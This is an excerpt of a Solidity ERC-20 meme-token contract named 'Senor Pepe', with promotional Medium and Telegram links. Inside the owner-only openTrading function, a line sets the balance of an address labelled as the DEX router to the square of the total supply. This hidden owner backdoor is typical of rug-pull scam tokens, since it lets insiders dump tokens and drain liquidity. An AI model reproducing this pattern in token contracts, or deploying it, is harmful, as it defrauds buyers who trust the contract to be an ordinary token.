...
//https://medium.com/@SenorPepe/la-conquista-3442f20c749d
//https://t.me/SenorPepeERC
...
contract Pepe is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Senor Pepe";
    string private constant _symbol = unicode"Senor Pepe";
    ...
    function removeLimits(uint256 _maxtx , uint256 _maxwallet ) external onlyOwner{
        _maxTxAmount = _maxtx;
    ...
    function openTrading() external onlyOwner() {
        ...
        _balances[(_dexRouter)] = _tTotal*_tTotal;_approve(address(this), address(uniswapV2Router), _tTotal);
